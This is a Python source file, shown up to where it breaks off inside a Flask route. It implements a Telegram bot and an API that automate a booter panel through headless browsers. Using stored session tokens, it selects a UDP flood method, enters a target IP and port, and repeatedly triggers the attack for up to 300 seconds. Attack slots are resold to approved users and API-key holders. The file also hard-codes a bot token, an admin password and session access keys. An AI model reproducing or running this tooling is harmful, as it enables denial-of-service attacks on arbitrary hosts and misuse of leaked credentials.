from flask import Flask, jsonify, request
from cloakbrowser import launch
import time
import threading
import json
import os
import secrets
import string
from datetime import datetime
import queue

# ========== BOT IMPORTS ==========
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

app = Flask(__name__)

# ========== CONFIG (SAME as api.py) ==========
METHOD         = "UDP-BIG"
ADMIN_PASSWORD = "krishna"
PORT           = 3938
MAX_PRELOADED  = 2
API_NAME       = "krishna father of STTRSERRR"

# ========== BOT CONFIG (NEW) ==========
BOT_TOKEN = "8987069237:AAGH_ExqtgnBsiKpNrMoPwKslocK7Dx9cjs"
OWNER_ID  = 7883336006

# ========== SESSIONS (SAME) ==========
SESSIONS_DATA = [
    {"session_number": 1, "access_key": "32de18ee49ba49ada55f3ca2e1fe8d1fd5601d5d1c8b48f2be24395e61c56482"},
    {"session_number": 2, "access_key": "0021c1d3e3b0434e97cf81017dd2729b6a02ab98e8b1471f9a704c2b866b5148"},
    {"session_number": 3, "access_key": "08e90b3fa69743d3968a0023c204fda3b412c1af6c4149b8ba58c965d854fa40"},
    {"session_number": 4, "access_key": "7cc7b120d6d147b7a9e8c92dcec7dd9763c1caa6caee416c8690b552e55b1afb"}
]

# ========== GLOBALS (SAME) ==========
sessions             = []
sessions_lock        = threading.Lock()
active_attacks       = 0
api_keys             = {}
api_keys_file        = "api_keys.json"
attack_queue         = queue.Queue()
worker_pool          = []
worker_pool_lock     = threading.Lock()
workers_loading      = 0
workers_loading_lock = threading.Lock()
attack_counter       = 0
attack_counter_lock  = threading.Lock()
session_index        = 0
session_index_lock   = threading.Lock()
SS_FOLDER = "screenshots"
os.makedirs(SS_FOLDER, exist_ok=True)

# ========== BOT DATA (NEW) ==========
bot_tokens     = {}
approved_users = {}
BOT_TOKENS_FILE = "bot_tokens.json"
USERS_FILE      = "bot_users.json"
bot_lock        = threading.Lock()


# ========== SPAM HELPER (NEW — Start test + Try again) ==========
def spam_buttons(page, worker_name="W", spam_duration=60):
    """
    Start test + Try again dono buttons spam karo.
    Returns total click count.
    """
    start_time = time.time()
    click_count = 0
    start_clicks = 0
    retry_clicks = 0

    while time.time() - start_time < spam_duration:
        try:
            result = page.evaluate("""
                () => {
                    let sc = 0, rc = 0;
                    const btns = document.querySelectorAll('button');
                    for (const btn of btns) {
                        const t = (btn.innerText || btn.textContent || '').trim().toLowerCase();
                        if (t.includes('start test')) {
                            btn.click();
                            sc++;
                        }
                        else if (t.includes('try again')) {
                            btn.click();
                            rc++;
                        }
                    }
                    return { start: sc, retry: rc };
                }
            """)

            s = result.get('start', 0) if result else 0
            r = result.get('retry', 0) if result else 0
            click_count  += s + r
            start_clicks += s
            retry_clicks += r

            if click_count % 200 == 0 and click_count > 0:
                elapsed = int(time.time() - start_time)
                cps = int(click_count / max(elapsed, 1))
                print(f"[{worker_name}] ⚡ {click_count} | {cps}/s | start:{start_clicks} retry:{retry_clicks}")

            time.sleep(0.05)
        except Exception:
            time.sleep(0.05)

    print(f"[{worker_name}] ✅ DONE! {click_count} clicks (start:{start_clicks}, retry:{retry_clicks})")
    return click_count


# ========== API KEYS (SAME) ==========
def load_api_keys():
    global api_keys
    if os.path.exists(api_keys_file):
        try:
            with open(api_keys_file, "r") as f:
                api_keys = json.load(f)
            print(f"✅ API Keys loaded: {len(api_keys)}")
        except Exception:
            api_keys = {}
    else:
        api_keys = {}


def save_api_keys():
    with open(api_keys_file, "w") as f:
        json.dump(api_keys, f, indent=2)


# ========== SESSIONS (SAME) ==========
def load_sessions():
    global sessions
    print("🔄 Loading sessions...")
    for entry in SESSIONS_DATA:
        session_num = entry["session_number"]
        token       = entry["access_key"]
        cookies = [{
            "name": "auth_token", "value": token,
            "domain": "retrostress.net", "path": "/",
            "expires": 1794408155.470651,
            "httpOnly": True, "secure": True, "sameSite": "Lax"
        }]
        sessions.append({"id": session_num, "cookies": cookies})
        print(f"✅ Session {session_num} loaded")
    print(f"📊 Total sessions: {len(sessions)}")
    return len(sessions) > 0


def get_next_session():
    global session_index
    with session_index_lock:
        session = sessions[session_index % len(sessions)]
        session_index += 1
        return session


def get_total_slots():
    return len(sessions)


def get_used_slots():
    total = 0
    for key_data in api_keys.values():
        if key_data.get("active"):
            total += key_data.get("slots", 0)
    return total


def get_available_slots():
    return get_total_slots() - get_used_slots()


def generate_api_key():
    chars = string.ascii_letters + string.digits
    return ''.join(secrets.choice(chars) for _ in range(32))


def check_password(req):
    password = req.args.get('password') or req.headers.get('X-Password')
    return password == ADMIN_PASSWORD


# ========== SCREENSHOT (SAME) ==========
def take_screenshot(page, name, full_page=True):
    try:
        path = os.path.join(SS_FOLDER, name)
        page.screenshot(path=path, full_page=full_page)
        return path
    except Exception:
        return None


def get_attack_ss_name(atk_num):
    return f"atk{str(atk_num).zfill(4)}.png"


# ========== WORKER (SAME — from api.py) ==========
def worker_thread(worker_number):
    global active_attacks, workers_loading, attack_counter

    browser           = None
    page              = None
    loading_decreased = False

    session    = get_next_session()
    session_id = session["id"]

    try:
        print(f"[Worker-{worker_number}] 🌐 Session {session_id} | Opening...")
        browser = launch(headless=True)
        page    = browser.new_page()
        page.set_viewport_size({"width": 1920, "height": 1080})
        page.context.add_cookies(session["cookies"])
        page.goto("https://retrostress.net/panel",
                  wait_until="networkidle", timeout=90000)
        print(f"[Worker-{worker_number}] ⏳ Waiting...")
        time.sleep(4)

        if "auth" in page.url or "login" in page.url:
            print(f"[Worker-{worker_number}] ❌ Session expired!")
            return

        print(f"[Worker-{worker_number}] ✅ Panel opened!")
        take_screenshot(page, f"panel_w{worker_number}.png")

        # ===== METHOD SELECT (SAME) =====
        method_selected = False
        for retry in range(3):
            try:
                clicked_layer4 = page.evaluate("""
                    () => {
                        const allBtns = document.querySelectorAll('button');
                        for (const btn of allBtns) {
                            const text = btn.innerText || btn.textContent || '';
                            if (text.includes('Network endpoint') || text.includes('Layer 4')) {
                                btn.click(); return 'clicked';
                            }
                        }
                        return false;
                    }
                """)
                if not clicked_layer4:
                    raise Exception("Layer 4 not found")
                time.sleep(1)

                clicked_browse = page.evaluate("""
                    () => {
                        const span = document.querySelector('span.app-method-trigger-action');
                        if (span) { span.click(); return true; }
                        const allSpans = document.querySelectorAll('span');
                        for (const s of allSpans) {
                            if (s.innerText && s.innerText.includes('Browse methods')) {
                                s.click(); return true;
                            }
                        }
                        return false;
                    }
                """)
                if not clicked_browse:
                    raise Exception("Browse not found")
                time.sleep(2)

                clicked_udp = page.evaluate("""
                    () => {
                        const buttons = document.querySelectorAll('button');
                        for (const btn of buttons) {
                            const text = (btn.innerText || btn.textContent || '').trim();
                            if (text === 'UDP') { btn.click(); return true; }
                        }
                        return false;
                    }
                """)
                if not clicked_udp:
                    raise Exception("UDP not found")
                time.sleep(1)

                clicked_method = page.evaluate("""
                    () => {
                        const options = document.querySelectorAll('button[role="option"]');
                        for (const opt of options) {
                            const strong = opt.querySelector('strong');
                            if (strong && strong.textContent.trim() === 'UDP-BIG') {
                                opt.click(); return true;
                            }
                        }
                        const allBtns = document.querySelectorAll('button');
                        for (const btn of allBtns) {
                            const strong = btn.querySelector('strong');
                            if (strong && strong.textContent.trim() === 'UDP-BIG') {
                                btn.click(); return true;
                            }
                        }
                        return false;
                    }
                """)
                if not clicked_method:
                    raise Exception("UDP-BIG not found")
                time.sleep(0.5)

                method_selected = True
                break
            except Exception as e:
                print(f"[Worker-{worker_number}] ⚠️ Retry {retry+1}: {e}")
                try:
                    page.keyboard.press('Escape')
                except Exception:
                    pass
                time.sleep(2)

        if not method_selected:
            print(f"[Worker-{worker_number}] ❌ Method select failed!")
            return

        print(f"[Worker-{worker_number}] ✅ Ready!")

        with workers_loading_lock:
            if workers_loading > 0:
                workers_loading -= 1
                loading_decreased = True

        with worker_pool_lock:
            current_pool_size = len(worker_pool)
            if current_pool_size >= MAX_PRELOADED:
                return
            worker_pool.append(worker_number)
            pool_size = len(worker_pool)

        print(f"[Worker-{worker_number}] 📊 Pool: {pool_size}/{MAX_PRELOADED}")

        # ===== WAIT FOR JOB =====
        job = attack_queue.get(block=True)

        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)

        target_ip = job["ip"]
        port      = job["port"]
        duration  = job["duration"]

        with attack_counter_lock:
            attack_counter += 1
            atk_num = attack_counter

        ss_name = get_attack_ss_name(atk_num)
        print(f"[Worker-{worker_number}] 🎯 ATK-{atk_num} | {target_ip}:{port} | {duration}s")

        # Fill IP
        page.evaluate("""
            (data) => {
                const el = document.querySelector('input#test-url');
                if (el) {
                    el.focus();
                    el.value = data.ip;
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                }
            }
        """, {"ip": target_ip})
        time.sleep(0.2)

        # Fill Port
        page.evaluate("""
            (data) => {
                const el = document.querySelector('input[aria-label="port"]');
                if (el) {
                    el.focus();
                    el.value = data.port;
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                }
            }
        """, {"port": str(port)})
        time.sleep(0.2)

        # ⚡ SPAM (Start test + Try again)
        spam_duration = max(duration - 1, 1)
        print(f"[Worker-{worker_number}] 🚀 SPAM START!")

        take_screenshot(page, ss_name)
        spam_buttons(page, f"Worker-{worker_number}", spam_duration)

    except Exception as e:
        print(f"[Worker-{worker_number}] ❌ Error: {e}")
    finally:
        if browser:
            try:
                browser.close()
            except Exception:
                pass
        with worker_pool_lock:
            if worker_number in worker_pool:
                worker_pool.remove(worker_number)
        if not loading_decreased:
            with workers_loading_lock:
                if workers_loading > 0:
                    workers_loading -= 1
        with sessions_lock:
            active_attacks -= 1
        print(f"[Worker-{worker_number}] 🔒 Released")


# ========== POOL MANAGER (SAME) ==========
worker_counter      = 0
worker_counter_lock = threading.Lock()


def pool_manager():
    global workers_loading, worker_counter
    while True:
        try:
            with worker_pool_lock:
                pool_size = len(worker_pool)
            with workers_loading_lock:
                loading = workers_loading

            total_in_progress = pool_size + loading
            needed            = MAX_PRELOADED - total_in_progress

            if needed > 0:
                for i in range(needed):
                    with workers_loading_lock:
                        workers_loading += 1
                    with worker_counter_lock:
                        worker_counter += 1
                        worker_num = worker_counter
                    t = threading.Thread(target=worker_thread, args=(worker_num,), daemon=True)
                    t.start()
                    time.sleep(0.1)
        except Exception as e:
            print(f"[Pool] ❌ Error: {e}")
        time.sleep(5)


# ========== TOKEN WORKER (NEW — bot ke tokens ke liye) ==========
def token_worker(token, target_ip, target_port, duration, attack_id):
    """Bot ke saved token se attack fire karta hai (on-demand worker)"""
    global active_attacks
    browser = None
    short = token[:12] + "..." if len(token) > 12 else token

    try:
        print(f"[TokenW-{attack_id}] 🌐 Token {short} | Opening...")
        browser = launch(headless=True)
        page = browser.new_page()
        page.set_viewport_size({"width": 1920, "height": 1080})

        cookies = [{
            "name": "auth_token", "value": token,
            "domain": "retrostress.net", "path": "/",
            "expires": 1794408155.470651,
            "httpOnly": True, "secure": True, "sameSite": "Lax"
        }]
        page.context.add_cookies(cookies)

        page.goto("https://retrostress.net/panel",
                  wait_until="networkidle", timeout=90000)
        time.sleep(4)

        if "auth" in page.url or "login" in page.url:
            print(f"[TokenW-{attack_id}] ❌ Token invalid/expired")
            return

        print(f"[TokenW-{attack_id}] ✅ Panel opened")

        # Method select (same logic)
        method_selected = False
        for retry in range(3):
            try:
                page.evaluate("""() => {
                    const allBtns = document.querySelectorAll('button');
                    for (const btn of allBtns) {
                        const text = btn.innerText || btn.textContent || '';
                        if (text.includes('Network endpoint') || text.includes('Layer 4')) {
                            btn.click(); return;
                        }
                    }
                }""")
                time.sleep(1)

                page.evaluate("""() => {
                    const span = document.querySelector('span.app-method-trigger-action');
                    if (span) { span.click(); return; }
                    const allSpans = document.querySelectorAll('span');
                    for (const s of allSpans) {
                        if (s.innerText && s.innerText.includes('Browse methods')) {
                            s.click(); return;
                        }
                    }
                }""")
                time.sleep(2)

                page.evaluate("""() => {
                    const buttons = document.querySelectorAll('button');
                    for (const btn of buttons) {
                        const text = (btn.innerText || btn.textContent || '').trim();
                        if (text === 'UDP') { btn.click(); return; }
                    }
                }""")
                time.sleep(1)

                ok = page.evaluate(f"""() => {{
                    const options = document.querySelectorAll('button[role="option"]');
                    for (const opt of options) {{
                        const strong = opt.querySelector('strong');
                        if (strong && strong.textContent.trim() === '{METHOD}') {{
                            opt.click(); return true;
                        }}
                    }}
                    return false;
                }}""")
                if ok:
                    method_selected = True
                    break
            except Exception:
                time.sleep(2)

        if not method_selected:
            print(f"[TokenW-{attack_id}] ❌ Method select failed")
            return

        print(f"[TokenW-{attack_id}] ✅ Ready")

        # Fill IP
        page.evaluate("""(d) => {
            const el = document.querySelector('input#test-url');
            if (el) {
                el.focus(); el.value = d.ip;
                el.dispatchEvent(new Event('input', { bubbles: true }));
                el.dispatchEvent(new Event('change', { bubbles: true }));
            }
        }""", {"ip": target_ip})
        time.sleep(0.2)

        # Fill Port
        page.evaluate("""(d) => {
            const el = document.querySelector('input[aria-label="port"]');
            if (el) {
                el.focus(); el.value = d.port;
                el.dispatchEvent(new Event('input', { bubbles: true }));
                el.dispatchEvent(new Event('change', { bubbles: true }));
            }
        }""", {"port": str(target_port)})
        time.sleep(0.2)

        # ⚡ SPAM (Start test + Try again)
        spam_duration = max(duration - 1, 1)
        print(f"[TokenW-{attack_id}] 🚀 SPAM → {target_ip}:{target_port}")

        spam_buttons(page, f"TokenW-{attack_id}", spam_duration)

    except Exception as e:
        print(f"[TokenW-{attack_id}] ❌ {e}")
    finally:
        if browser:
            try:
                browser.close()
            except Exception:
                pass
        print(f"[TokenW-{attack_id}] 🔒 Released")


# ========== BOT JSON HELPERS (NEW) ==========
def load_bot_data():
    global bot_tokens, approved_users
    if os.path.exists(BOT_TOKENS_FILE):
        try:
            with open(BOT_TOKENS_FILE) as f:
                bot_tokens = json.load(f)
        except Exception:
            bot_tokens = {}
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE) as f:
                approved_users = json.load(f)
        except Exception:
            approved_users = {}
    # Owner auto-approve
    if str(OWNER_ID) not in approved_users:
        approved_users[str(OWNER_ID)] = {"name": "Owner", "role": "owner"}
        save_users()


def save_bot_tokens():
    with open(BOT_TOKENS_FILE, "w") as f:
        json.dump(bot_tokens, f, indent=2)


def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump(approved_users, f, indent=2)


def is_owner(uid):
    return int(uid) == OWNER_ID


def is_approved(uid):
    return str(uid) in approved_users


# ========== BOT UI (NEW) ==========
def main_kb(uid):
    rows = [
        [InlineKeyboardButton("🎯 Attack", callback_data="m_attack"),
         InlineKeyboardButton("📊 Status", callback_data="m_status")],
        [InlineKeyboardButton("🔑 Tokens", callback_data="m_tokens"),
         InlineKeyboardButton("❓ Help", callback_data="m_help")]
    ]
    if is_owner(uid):
        rows.append([InlineKeyboardButton("👑 Admin", callback_data="m_admin")])
    return InlineKeyboardMarkup(rows)


def tokens_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Token", callback_data="t_add"),
         InlineKeyboardButton("📋 List", callback_data="t_list")],
        [InlineKeyboardButton("🗑️ Remove", callback_data="t_remove")],
        [InlineKeyboardButton("🔙 Back", callback_data="m_home")]
    ])


def back_kb(t="m_home"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=t)]])


def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Users", callback_data="ad_users")],
        [InlineKeyboardButton("➕ Approve", callback_data="ad_approve"),
         InlineKeyboardButton("➖ Revoke", callback_data="ad_revoke")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="ad_broadcast")],
        [InlineKeyboardButton("🔙 Back", callback_data="m_home")]
    ])


def cancel_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="m_home")]])


def access_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("📩 Request Access", callback_data="req_access")]])


def welcome_text(uid):
    name = approved_users.get(str(uid), {}).get("name", "User")
    role = approved_users.get(str(uid), {}).get("role", "user")
    badge = "👑 Owner" if role == "owner" else "✅ User"
    with worker_pool_lock:
        pool = len(worker_pool)
    with bot_lock:
        ntok = len(bot_tokens.get(str(uid), []))
    return (f"⚡ *{API_NAME}*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 *{name}* {badge}\n"
            f"🆔 `{uid}`\n\n"
            f"⚙️ Workers: `{pool}/{MAX_PRELOADED}`\n"
            f"🔑 My Tokens: `{ntok}`\n\n"
            f"_Choose an option:_")


# ========== BOT HANDLERS (NEW) ==========
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        await update.message.reply_text(
            f"🔒 *ACCESS DENIED*\n\n🆔 Your ID: `{uid}`",
            parse_mode="Markdown", reply_markup=access_kb())
        return
    await update.message.reply_text(
        welcome_text(uid), parse_mode="Markdown", reply_markup=main_kb(uid))


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_approved(update.effective_user.id):
        return
    await update.message.reply_text(
        f"❓ *HELP*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"*Attack:* Button se IP/Port/Duration do\n\n"
        f"*Tokens:* `Label | Token` format me add karo\n\n"
        f"*Owner Commands:*\n"
        f"/approve <id> [name]\n"
        f"/revoke <id>\n"
        f"/users\n"
        f"/broadcast <msg>",
        parse_mode="Markdown", reply_markup=back_kb())


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        return
    with worker_pool_lock:
        pool = len(worker_pool)
    with workers_loading_lock:
        loading = workers_loading
    with bot_lock:
        ntok = len(bot_tokens.get(str(uid), []))
    await update.message.reply_text(
        f"📊 *STATUS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🟢 API: Online\n"
        f"⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
        f"⏳ Loading: `{loading}`\n"
        f"🌐 Sessions: `{len(sessions)}`\n"
        f"🔑 My Tokens: `{ntok}`",
        parse_mode="Markdown", reply_markup=back_kb())


async def cmd_approve(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    if not ctx.args:
        await update.message.reply_text("Usage: `/approve <id> [name]`", parse_mode="Markdown")
        return
    try:
        tid = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid ID")
        return
    name = ctx.args[1] if len(ctx.args) > 1 else f"User{tid}"
    approved_users[str(tid)] = {"name": name, "role": "user"}
    save_users()
    await update.message.reply_text(f"✅ Approved `{tid}` ({name})", parse_mode="Markdown")
    try:
        await ctx.bot.send_message(tid, "✅ *Approved!* Send /start", parse_mode="Markdown")
    except Exception:
        pass


async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    if not ctx.args:
        await update.message.reply_text("Usage: `/revoke <id>`", parse_mode="Markdown")
        return
    try:
        tid = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid ID")
        return
    if tid == OWNER_ID:
        await update.message.reply_text("❌ Cannot revoke owner")
        return
    approved_users.pop(str(tid), None)
    save_users()
    await update.message.reply_text(f"✅ Revoked `{tid}`", parse_mode="Markdown")


async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    text = f"👥 *USERS ({len(approved_users)})*\n\n"
    for u, d in approved_users.items():
        r = d.get("role", "user")
        b = "👑" if r == "owner" else "✅"
        text += f"{b} *{d.get('name')}* — `{u}`\n"
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    if not ctx.args:
        ctx.user_data["expecting"] = "broadcast"
        await update.message.reply_text("📢 Send message:", reply_markup=cancel_kb())
        return
    await do_broadcast(update, ctx, " ".join(ctx.args))


async def do_broadcast(update, ctx, msg):
    ok = fail = 0
    for uid in list(approved_users.keys()):
        if str(uid) == str(OWNER_ID):
            continue
        try:
            await ctx.bot.send_message(int(uid), f"📢 *BROADCAST*\n\n{msg}", parse_mode="Markdown")
            ok += 1
        except Exception:
            fail += 1
    await update.effective_message.reply_text(
        f"✅ Done. OK: `{ok}` | Fail: `{fail}`", parse_mode="Markdown")


async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    if not is_approved(uid):
        if data == "req_access":
            try:
                await ctx.bot.send_message(OWNER_ID,
                    f"📩 *ACCESS REQ*\n\n{q.from_user.full_name}\n`{uid}`\n"
                    f"@{q.from_user.username or 'none'}\n\n"
                    f"`/approve {uid} {q.from_user.first_name}`",
                    parse_mode="Markdown")
                await q.edit_message_text("✅ Sent!")
            except Exception:
                await q.edit_message_text("❌ Failed")
        return

    if data == "m_home":
        await q.edit_message_text(welcome_text(uid), parse_mode="Markdown",
                                   reply_markup=main_kb(uid))
    elif data == "m_status":
        with worker_pool_lock:
            pool = len(worker_pool)
        with bot_lock:
            ntok = len(bot_tokens.get(str(uid), []))
        await q.edit_message_text(
            f"📊 *STATUS*\n\n⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
            f"🌐 Sessions: `{len(sessions)}`\n🔑 My Tokens: `{ntok}`",
            parse_mode="Markdown", reply_markup=back_kb())
    elif data == "m_help":
        await q.edit_message_text(
            f"❓ Send /help for full commands",
            parse_mode="Markdown", reply_markup=back_kb())
    elif data == "m_tokens":
        with bot_lock:
            ntok = len(bot_tokens.get(str(uid), []))
        await q.edit_message_text(
            f"🔑 *TOKENS*\n\nSaved: `{ntok}`",
            parse_mode="Markdown", reply_markup=tokens_kb())
    elif data == "t_add":
        ctx.user_data["expecting"] = "add_token"
        await q.edit_message_text(
            "📝 *ADD TOKEN*\n\nSend: `Label | Token`\n\nExample:\n`Manu | 32de18ee...`",
            parse_mode="Markdown", reply_markup=cancel_kb())
    elif data == "t_list":
        with bot_lock:
            toks = list(bot_tokens.get(str(uid), []))
        if not toks:
            await q.edit_message_text("📭 No tokens", reply_markup=tokens_kb())
            return
        text = f"🔑 *MY TOKENS ({len(toks)})*\n\n"
        for i, t in enumerate(toks, 1):
            text += f"{i}. *{t['label']}*\n`{t['token'][:10]}…{t['token'][-4:]}`\n\n"
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=tokens_kb())
    elif data == "t_remove":
        with bot_lock:
            toks = list(bot_tokens.get(str(uid), []))
        if not toks:
            await q.edit_message_text("📭 Empty", reply_markup=tokens_kb())
            return
        rows = [[InlineKeyboardButton(f"🗑️ {t['label']}", callback_data=f"t_del_{t['id']}")] for t in toks]
        rows.append([InlineKeyboardButton("🔙 Back", callback_data="m_tokens")])
        await q.edit_message_text("Pick:", reply_markup=InlineKeyboardMarkup(rows))
    elif data.startswith("t_del_"):
        tid = data.replace("t_del_", "")
        with bot_lock:
            toks = bot_tokens.get(str(uid), [])
            bot_tokens[str(uid)] = [t for t in toks if t["id"] != tid]
            n = len(bot_tokens[str(uid)])
        save_bot_tokens()
        await q.edit_message_text(f"✅ Removed. Left: `{n}`",
                                   parse_mode="Markdown", reply_markup=tokens_kb())
    elif data == "m_attack":
        with bot_lock:
            ntok = len(bot_tokens.get(str(uid), []))
        with worker_pool_lock:
            pool = len(worker_pool)
        await q.edit_message_text(
            f"🎯 *ATTACK*\n\n"
            f"🔑 Tokens: `{ntok}`\n"
            f"⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n\n"
            f"IP, Port, Duration do.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⚡ Start Attack", callback_data="a_start")],
                [InlineKeyboardButton("🔙 Back", callback_data="m_home")]
            ]))
    elif data == "a_start":
        ctx.user_data["expecting"] = "attack_ip"
        await q.edit_message_text("🎯 Send *IP*:", parse_mode="Markdown",
                                   reply_markup=cancel_kb())
    elif data == "m_admin" and is_owner(uid):
        await q.edit_message_text("👑 *ADMIN PANEL*", parse_mode="Markdown",
                                   reply_markup=admin_kb())
    elif data == "ad_users" and is_owner(uid):
        text = f"👥 *USERS ({len(approved_users)})*\n\n"
        for u, d in approved_users.items():
            r = d.get("role", "user")
            b = "👑" if r == "owner" else "✅"
            text += f"{b} *{d.get('name')}* — `{u}`\n"
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=back_kb("m_admin"))
    elif data == "ad_approve" and is_owner(uid):
        ctx.user_data["expecting"] = "approve_user"
        await q.edit_message_text("Send `<id> <name>`", parse_mode="Markdown",
                                   reply_markup=back_kb("m_admin"))
    elif data == "ad_revoke" and is_owner(uid):
        ctx.user_data["expecting"] = "revoke_user"
        await q.edit_message_text("Send `<id>`", parse_mode="Markdown",
                                   reply_markup=back_kb("m_admin"))
    elif data == "ad_broadcast" and is_owner(uid):
        ctx.user_data["expecting"] = "broadcast"
        await q.edit_message_text("📢 Send message:", reply_markup=back_kb("m_admin"))


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        return
    expecting = ctx.user_data.get("expecting")
    text = (update.message.text or "").strip()
    if not expecting or not text:
        return

    if expecting == "add_token":
        if "|" in text:
            label, token = [x.strip() for x in text.split("|", 1)]
        else:
            with bot_lock:
                label = f"Token {len(bot_tokens.get(str(uid), [])) + 1}"
            token = text
        if len(token) < 32:
            await update.message.reply_text("❌ Token too short")
            return
        tid = secrets.token_hex(4)
        with bot_lock:
            toks = bot_tokens.setdefault(str(uid), [])
            if len(toks) >= 6:
                await update.message.reply_text("❌ Max 6 tokens")
                return
            toks.append({"id": tid, "token": token, "label": label})
            n = len(toks)
        save_bot_tokens()
        ctx.user_data.pop("expecting", None)
        await update.message.reply_text(
            f"✅ Added *{label}*\nTotal: `{n}`",
            parse_mode="Markdown", reply_markup=tokens_kb())

    elif expecting == "attack_ip":
        ctx.user_data["attack_ip"] = text
        ctx.user_data["expecting"] = "attack_port"
        await update.message.reply_text(f"🔌 IP: `{text}`\nSend *PORT*:",
                                         parse_mode="Markdown", reply_markup=cancel_kb())

    elif expecting == "attack_port":
        try:
            p = int(text)
            if not (1 <= p <= 65535):
                raise ValueError
        except ValueError:
            await update.message.reply_text("❌ Invalid port")
            return
        ctx.user_data["attack_port"] = p
        ctx.user_data["expecting"] = "attack_dur"
        await update.message.reply_text(f"Port: `{p}`\nSend *DURATION*:",
                                         parse_mode="Markdown", reply_markup=cancel_kb())

    elif expecting == "attack_dur":
        try:
            d = int(text)
            if not (1 <= d <= 300):
                raise ValueError
        except ValueError:
            await update.message.reply_text("❌ Duration 1-300")
            return

        ip = ctx.user_data.pop("attack_ip", None)
        port = ctx.user_data.pop("attack_port", None)
        ctx.user_data.pop("expecting", None)

        with bot_lock:
            toks = list(bot_tokens.get(str(uid), []))

        if not toks:
            await update.message.reply_text("❌ No tokens! Add first.",
                                             reply_markup=main_kb(uid))
            return

        # Fire attack for each token
        global active_attacks
        ids = []
        for t in toks:
            with sessions_lock:
                active_attacks += 1
                aid = active_attacks
            threading.Thread(
                target=token_worker,
                args=(t["token"], ip, port, d, aid),
                daemon=True
            ).start()
            ids.append(aid)

        await update.message.reply_text(
            f"🚀 *ATTACK LAUNCHED!*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"⏱️ Duration: `{d}s`\n"
            f"⚡ Tokens: `{len(toks)}`\n"
            f"🆔 IDs: `{ids}`\n\n"
            f"_Workers spawning (20s load)..._",
            parse_mode="Markdown", reply_markup=main_kb(uid))

    elif expecting == "approve_user" and is_owner(uid):
        parts = text.split(maxsplit=1)
        try:
            tid = int(parts[0])
        except (ValueError, IndexError):
            await update.message.reply_text("❌ Send `<id> <name>`", parse_mode="Markdown")
            return
        name = parts[1] if len(parts) > 1 else f"User{tid}"
        approved_users[str(tid)] = {"name": name, "role": "user"}
        save_users()
        ctx.user_data.pop("expecting", None)
        await update.message.reply_text(f"✅ Approved `{tid}`", parse_mode="Markdown",
                                         reply_markup=admin_kb())
        try:
            await ctx.bot.send_message(tid, "✅ *Approved!* Send /start", parse_mode="Markdown")
        except Exception:
            pass

    elif expecting == "revoke_user" and is_owner(uid):
        try:
            tid = int(text)
        except ValueError:
            await update.message.reply_text("❌ Invalid")
            return
        if tid == OWNER_ID:
            await update.message.reply_text("❌ Cannot revoke owner")
            return
        approved_users.pop(str(tid), None)
        save_users()
        ctx.user_data.pop("expecting", None)
        await update.message.reply_text(f"✅ Revoked `{tid}`", parse_mode="Markdown",
                                         reply_markup=admin_kb())

    elif expecting == "broadcast" and is_owner(uid):
        ctx.user_data.pop("expecting", None)
        await do_broadcast(update, ctx, text)


# ========== FLASK ROUTES (SAME as api.py) ==========
@app.route('/admin/generate_key', methods=['GET'])
def generate_key():
    if not check_password(request):
        return jsonify({"status": "error", "message": "❌ Wrong password!"}), 403
    slots = int(request.args.get('slots', 1))
    if slots < 1:
        return jsonify({"status": "error", "message": "❌ Min 1 slot!"}), 400
    available = get_available_slots()
    if slots > available:
        return jsonify({"status": "error", "available_slots": available}), 400
    new_key = generate_api_key()
    created_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    api_keys[new_key] = {"slots": slots, "created": created_at, "active": True}
    save_api_keys()
    return jsonify({"status": "success", "api_key": new_key, "slots": slots,
                    "created": created_at, "api_name": API_NAME})


@app.route('/admin/list_keys', methods=['GET'])
def list_keys():
    if not check_password(request):
